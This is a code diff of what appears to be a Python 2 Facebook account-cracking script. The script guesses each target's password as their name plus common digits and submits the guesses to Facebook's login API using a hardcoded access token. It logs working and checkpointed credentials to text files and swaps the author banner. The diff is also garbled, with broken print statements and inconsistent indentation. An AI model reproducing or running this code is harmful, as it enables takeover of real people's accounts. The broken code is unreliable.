@@ -295,6 +295,7 @@ def menu_s():
                 cp.close()
                 cps.append(uid + pass1)
             else:
+                pass2=name+"1234"
                 data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                 q = json.loads(data)
                 if 'loc' in q:
@@ -310,6 +311,7 @@ def menu_s():
                     cp.close()
                     cps.append(uid + pass2)
                 else:
+                    pass3=name+"12345"
                     data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                     q = json.loads(data)
                     if 'loc' in q:
@@ -510,14 +512,87 @@ def n_s():
         print 47 * '-'
         print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
         print 47 * '-'
-        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
-        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
-        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
-        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
-        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
-        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
-        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
-        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
+        print(")
+    
+    
+     def main(arg):
+
+
+		user=arg
+
+ 
+
+		uid,name=user.split("=")
+
+ 
+
+		try:
+
+ 
+
+		    pass1=name+"123"
+
+ 
+
+		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
+
+ 
+
+		    d=json.loads(q)
+
+ 
+
+		    if 'www.facebook.com' in d['error_msg']:
+
+ 
+
+		        print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass1)
+
+ 
+
+		        cp=open("mzcp.txt","a")
+
+ 
+
+		        cp.write(uid+" = "+pass1+"\n")
+
+ 
+
+		        cp.close()
+
+ 
+
+		        cps.append(uid)
+
+ 
+
+		    else:
+
+ 
+
+		    	if "access_token" in d:
+
+ 
+
+		            print("\x1b[1;97m[HAM = OK] "+uid+" = "+pass1+"\x1b[1;0m")
+
+ 
+
+		            ok=open("mzok.txt","a")
+
+ 
+
+		            ok.write(uid+" = "+pass1+"\n")
+
+ 
+
+		            ok.close()
+
+ 
+
+		            oks.append(uid)
+
+ 
         try:
             idlist = raw_input('[+] File Name: ')
             for line in open(idlist, 'r').readlines():
@@ -539,7 +614,7 @@ def n_s():
     print ' \x1b[1;97mCrack Running\x1b[1;91m '
     time.sleep(0.5)
     print 47 * '-'
-    print '\t\x1b[1;94m{RANA NADEEM RAJPUT}\x1b[1;91m'
+    print '\t\x1b[1;94m{HAMAYUN}\x1b[1;91m'
     print 47 * '-'
 
     def main(arg):
